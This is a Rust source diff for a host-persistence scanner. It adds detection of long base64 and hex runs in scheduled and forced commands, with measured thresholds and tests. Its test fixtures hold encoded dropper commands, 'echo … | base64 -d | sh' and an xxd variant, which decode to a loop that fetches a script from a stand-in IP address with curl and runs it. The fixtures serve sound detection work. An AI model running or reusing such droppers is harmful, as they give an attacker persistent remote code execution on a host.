@@ -47,6 +47,13 @@ pub fn enrich(root: &Root, scan: &mut Scan) {
 
     let preloads = preload_entries(root, &scan.entries);
     scan.entries.extend(preloads);
+
+    // Last, so the synthesised entries — a preload, a chained interpreter —
+    // are measured by the same threshold as a collector's own.
+    for e in &mut scan.entries {
+        apply_encoding(e);
+    }
+
     scan.entries.sort_by(|a, b| (a.kind, &a.source, &a.name).cmp(&(b.kind, &b.source, &b.name)));
 }
 
@@ -312,6 +319,94 @@ fn resolve_link(root: &Root, source: &Path, target: &Path) -> PathBuf {
         Some(dir) => root.abs(root.rel(&dir.join(target))),
         None => target.to_path_buf(),
     }
+}
+
+/// Where a run of encoding characters stops being something an ordinary
+/// command carries. Measured, not chosen. Across the 913 commands collected
+/// from this host and five distribution roots (Debian 12 and 13, Ubuntu
+/// 24.04, Fedora 43, AlmaLinux 9), and every Exec=, ExecStart= and udev RUN
+/// line in 1,624 unit, desktop, rule and cron files, the longest base64-
+/// alphabet run was 38 — `LVM_SUPPRESS_LOCKING_FAILURE_MESSAGES=` — and the
+/// longest hex run was 40, a sha1 directory name inside a Wine launcher's
+/// Exec line. Above those sit fixed-length families a scan will meet on a
+/// host that was not measured: a 32-character nix store hash or a GUID with
+/// its dashes stripped, and the 44 characters a sha256 takes in base64.
+///
+/// The hex ceiling is far higher because digests are ordinary. A sha256 is 64
+/// hex characters and a sha512 is 128, and both are written out in commands
+/// that are doing their job: `--hash=sha256:...`, a verity root hash, a
+/// container id, a machine id. A hex threshold at or below 128 reports those,
+/// and a flag that fires on them is worse than no flag at all.
+const BASE64_RUN: usize = 48;
+const HEX_RUN: usize = 160;
+
+/// The longest run of encoding characters in a command that reaches its
+/// alphabet's threshold: offset, length, and which alphabet.
+///
+/// `/` and `-` end a run although both are encoding characters, because every
+/// long run containing them on a real host was a path or a hyphenated name:
+/// `/usr/lib/systemd/system-generators/systemd-hibernate-resume-generator` is
+/// a single 69-character run otherwise, and so is every UUID. What that costs
+/// is symmetric and small — standard base64 is then broken only by `/` and
+/// URL-safe base64 only by `-`, about one character in 64 either way — so a
+/// payload is chopped into pieces rather than hidden: a 128-byte random
+/// payload still leaves a 48-character run 97% of the time, and base64 of
+/// text, which is what a shell dropper carries, is usually not broken at all.
+///
+/// A run drawn entirely from the hex alphabet is judged as hex even though it
+/// is also valid base64. That is what keeps a sha256 out of the report.
+fn encoded_run(command: &[u8]) -> Option<(usize, usize, &'static str)> {
+    let is_core = |b: u8| b.is_ascii_alphanumeric() || b == b'+' || b == b'_';
+    let mut best: Option<(usize, usize, &'static str)> = None;
+    let mut i = 0;
+    while i < command.len() {
+        if !is_core(command[i]) {
+            i += 1;
+            continue;
+        }
+        let start = i;
+        while i < command.len() && is_core(command[i]) {
+            i += 1;
+        }
+        let body = i - start;
+        // `=` counts as base64 padding and only as padding; taken as an
+        // ordinary run character it would join a variable's name to its value
+        // and report the pair as one long run.
+        while i < command.len() && command[i] == b'=' && i - start < body + 2 {
+            i += 1;
+        }
+        let len = i - start;
+        let hex = len == body && command[start..i].iter().all(u8::is_ascii_hexdigit);
+        let (threshold, alphabet) = if hex { (HEX_RUN, "hex") } else { (BASE64_RUN, "base64") };
+        if len >= threshold && len > best.map_or(0, |(_, seen, _)| seen) {
+            best = Some((start, len, alphabet));
+        }
+    }
+    best
+}
+
+/// The second half of §8's EncodingAnomaly — the first being the non-UTF-8
+/// bytes each collector already reports. It lives here rather than in the
+/// collectors so that one threshold, derived from one measurement, governs
+/// every mechanism class.
+///
+/// `Kind::SshAuthorizedKey` is deliberately not exempt. Its key material
+/// never reaches `command`: the collector puts the blob's fingerprint in the
+/// entry name and the options in `raw`, and sets `command` only from a
+/// `command="..."` forced command or an `AuthorizedKeysCommand` directive.
+/// Exempting the kind would blind the flag on the one field of that entry
+/// that really is a command, and a forced command is where an attacker who
+/// already has a key line puts a payload.
+fn apply_encoding(entry: &mut Entry) {
+    let Some(command) = &entry.command else { return };
+    let Some((offset, len, alphabet)) = encoded_run(command) else { return };
+    entry.flag(Flag::EncodingAnomaly);
+    // Where the run is and how long it is, never the run itself and never a
+    // decode of it: §14.2 keeps scan output safe to paste into a ticket, and
+    // decoding would be a claim about what the bytes mean rather than a
+    // report of what they are. `explain <id>` re-reads the file for anyone
+    // who wants to look.
+    entry.note("encoded_run", format!("{alphabet}, {len} chars at offset {offset}"));
 }
 
 /// Collectors record which file shadows which; deciding that the relationship
@@ -842,5 +937,178 @@ mod tests {
         assert_eq!(ids.len(), total, "every synthesised entry needs its own identity");
 
         std::fs::remove_dir_all(&dir).unwrap();
+    }
+
+    /// base64 of a 77-byte shell loop — what `echo … | base64 -d | sh`
+    /// actually carries — and the same shape hex-encoded.
+    const B64_PAYLOAD: &str =
+        "IyEvYmluL3NoCndoaWxlIDo7IGRvIGN1cmwgLWZzU0wgaHR0cDovLzE5OC41MS4xMDAuNy9zIHwgc2g7IHNsZWVwIDYwMDsgZG9uZQo=";
+    const HEX_PAYLOAD: &str = "23212f62696e2f73680a7768696c65203a3b20646f206375726c202d6673534c20687474703a2f2f3139382e35312e3130302e372f737461676532207c2073683b20736c656570203630303b20646f6e650a6578697420300a";
+    /// A sha256 digest as `pip --require-hashes` writes it: 64 hex characters
+    /// in a command that is doing exactly what it is supposed to.
+    const SHA256: &str = "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08";
+    /// The sha1 directory name in an Autodesk Wine launcher on this host —
+    /// the longest hex run any real command in the measurement carried.
+    const WINE: &str = "sh -c 'wine \"/home/u/.wine/drive_c/Program Files/Autodesk/webdeploy/production/2b84ec48843dc39cc73fec4274fad44f45968ec2/Autodesk Identity Manager/AdskIdentityManager.exe\" \"%u\"'";
+
+    struct Encoded;
+
+    impl Collector for Encoded {
+        fn name(&self) -> &'static str {
+            "encoded"
+        }
+
+        fn collect(&self, cx: &mut Ctx) -> Vec<Entry> {
+            let jobs: Vec<(Kind, &str, &str, Vec<u8>)> = vec![
+                (
+                    Kind::Cron,
+                    "etc/cron.d/dropper",
+                    "dropper",
+                    format!("echo {B64_PAYLOAD} | base64 -d | sh").into_bytes(),
+                ),
+                (
+                    Kind::Cron,
+                    "etc/cron.d/hexdropper",
+                    "hexdropper",
+                    format!("echo {HEX_PAYLOAD} | xxd -r -p | sh").into_bytes(),
+                ),
+                (
+                    Kind::Cron,
+                    "etc/cron.d/pip",
+                    "pip",
+                    format!("/usr/bin/pip install --require-hashes --hash=sha256:{SHA256} requests")
+                        .into_bytes(),
+                ),
+                (
+                    Kind::Cron,
+                    "etc/cron.d/generator",
+                    "generator",
+                    b"/usr/lib/systemd/system-generators/systemd-hibernate-resume-generator --dry-run".to_vec(),
+                ),
+                (Kind::Cron, "etc/cron.d/wine", "wine", WINE.as_bytes().to_vec()),
+                (
+                    Kind::Cron,
+                    "etc/cron.d/lvm",
+                    "lvm",
+                    b"/usr/bin/env LVM_SUPPRESS_LOCKING_FAILURE_MESSAGES=1 /usr/sbin/lvm vgchange -aay".to_vec(),
+                ),
+                (
+                    Kind::Cron,
+                    "etc/cron.d/mount",
+                    "mount",
+                    b"/usr/bin/mount /dev/disk/by-uuid/123e4567-e89b-12d3-a456-426614174000 /mnt/data".to_vec(),
+                ),
+                // Padding characters alone, and bytes that are not UTF-8 at
+                // all: neither is a run, and neither may panic the pass.
+                (Kind::Cron, "etc/cron.d/padding", "padding", b"==== ============".to_vec()),
+                (Kind::Cron, "etc/cron.d/raw", "raw", vec![0xff; 200]),
+                // An ordinary forced command behind a key whose fingerprint —
+                // 44 base64 characters — is the entry's name, not its command.
+                (
+                    Kind::SshAuthorizedKey,
+                    "root/.ssh/authorized_keys",
+                    "SHA256:pyEwQNS9tWtxBjLUwlnHcXVELdTeMMRFDmDW6C/fqPs",
+                    b"/usr/bin/rrsync -ro /srv/backup".to_vec(),
+                ),
+                (
+                    Kind::SshAuthorizedKey,
+                    "root/.ssh/authorized_keys",
+                    "SHA256:hQ9tVqpJxS1ZrEoKnT3uWgYd8mLbC5fN0aXiR7vPjUw",
+                    format!("sh -c 'echo {B64_PAYLOAD} | base64 -d | sh'").into_bytes(),
+                ),
+            ];
+
+            jobs.into_iter()
+                .map(|(kind, source, name, command)| {
+                    let mut e = cx.entry(kind, source, name);
+                    e.trigger = Trigger::Schedule;
+                    e.principal = Some("root".to_string());
+                    if kind == Kind::SshAuthorizedKey {
+                        e.note("ssh_mechanism", "authorized-key");
+                        e.note("options", format!("command=\"{}\"", String::from_utf8_lossy(&command)));
+                    }
+                    e.command = Some(command);
+                    e
+                })
+                .collect()
+        }
+    }
+
+    #[test]
+    fn an_encoded_payload_is_reported_and_a_digest_is_not() {
+        let dir = std::env::temp_dir().join(format!("unbidden-encoding-{}", std::process::id()));
+        let _ = std::fs::remove_dir_all(&dir);
+        std::fs::create_dir_all(dir.join("etc/cron.d")).unwrap();
+        std::fs::create_dir_all(dir.join("root/.ssh")).unwrap();
+        for job in ["dropper", "hexdropper", "pip", "generator", "wine", "lvm", "mount", "padding", "raw"] {
+            std::fs::write(dir.join("etc/cron.d").join(job), b"@daily root x\n").unwrap();
+        }
+        std::fs::write(dir.join("root/.ssh/authorized_keys"), b"ssh-ed25519 AAAA\n").unwrap();
+
+        let root = Root::at(&dir).unwrap();
+        let collectors: Vec<Box<dyn Collector>> = vec![Box::new(Encoded)];
+        let mut scan = scan::run(&root, &Options { deep: false }, &collectors);
+        enrich(&root, &mut scan);
+
+        let dropper = find(&scan, "dropper");
+        assert!(dropper.has_flag(Flag::EncodingAnomaly));
+        assert_eq!(
+            dropper.raw["encoded_run"],
+            format!("base64, {} chars at offset 5", B64_PAYLOAD.len()),
+            "the operator is told where to look without being handed a decode"
+        );
+
+        let hex = find(&scan, "hexdropper");
+        assert!(hex.has_flag(Flag::EncodingAnomaly));
+        assert_eq!(hex.raw["encoded_run"], format!("hex, {} chars at offset 5", HEX_PAYLOAD.len()));
+
+        // Everything a working host does with long encoding-alphabet runs.
+        for ordinary in ["pip", "generator", "wine", "lvm", "mount", "padding", "raw"] {
+            let e = find(&scan, ordinary);
+            assert!(
+                !e.has_flag(Flag::EncodingAnomaly),
+                "{ordinary} is an ordinary command: {}",
+                String::from_utf8_lossy(e.command.as_deref().unwrap_or_default())
+            );
+            assert!(!e.raw.contains_key("encoded_run"));
+        }
+
+        // The key material never reaches `command` — the fingerprint is the
+        // name and the blob stays in the file — so the kind needs no
+        // exemption, and the forced command is read like any other.
+        let key = find(&scan, "SHA256:pyEwQNS9tWtxBjLUwlnHcXVELdTeMMRFDmDW6C/fqPs");
+        assert!(!key.has_flag(Flag::EncodingAnomaly), "a key blob is not a payload in a command");
+        let forced = find(&scan, "SHA256:hQ9tVqpJxS1ZrEoKnT3uWgYd8mLbC5fN0aXiR7vPjUw");
+        assert!(forced.has_flag(Flag::EncodingAnomaly), "a forced command is where a key line hides one");
+
+        std::fs::remove_dir_all(&dir).unwrap();
+    }
+
+    #[test]
+    fn a_run_ends_at_the_characters_that_make_a_path_or_a_uuid() {
+        // Both sides of every threshold, on the bytes alone.
+        let at = |s: &str| encoded_run(s.as_bytes()).map(|(o, l, a)| (o, l, a));
+        assert_eq!(at(&"X".repeat(47)), None);
+        assert_eq!(at(&"X".repeat(48)), Some((0, 48, "base64")));
+        assert_eq!(at(&"a".repeat(159)), None, "still hex, still under the hex threshold");
+        assert_eq!(at(&"a".repeat(160)), Some((0, 160, "hex")));
+        // A digest is a hex run whichever case it is written in, which is the
+        // whole reason the two thresholds differ.
+        assert_eq!(at(&"A".repeat(64)), None, "a sha256 in capitals is still a sha256");
+        assert_eq!(
+            at(&format!("g{}", "a".repeat(47))),
+            Some((0, 48, "base64")),
+            "one character outside the hex alphabet changes which threshold applies"
+        );
+        // A path and a UUID are runs only if the separators are not.
+        assert_eq!(at(&format!("/usr/{}/{}", "x".repeat(40), "y".repeat(40))), None);
+        assert_eq!(at(&format!("{}-{}-{}", "x".repeat(40), "y".repeat(40), "z".repeat(40))), None);
+        // `=` counts as padding, never as a join between two runs.
+        assert_eq!(at(&format!("{}={}", "X".repeat(40), "Y".repeat(40))), None);
+        assert_eq!(at(&format!("{}==", "X".repeat(46))), Some((0, 48, "base64")));
+        // The longest qualifying run is the one reported.
+        assert_eq!(at(&format!("{} {}", "X".repeat(50), "Y".repeat(60))), Some((51, 60, "base64")));
+        assert_eq!(encoded_run(b""), None);
+        assert_eq!(encoded_run(&[0xff; 300]), None);
     }
 }
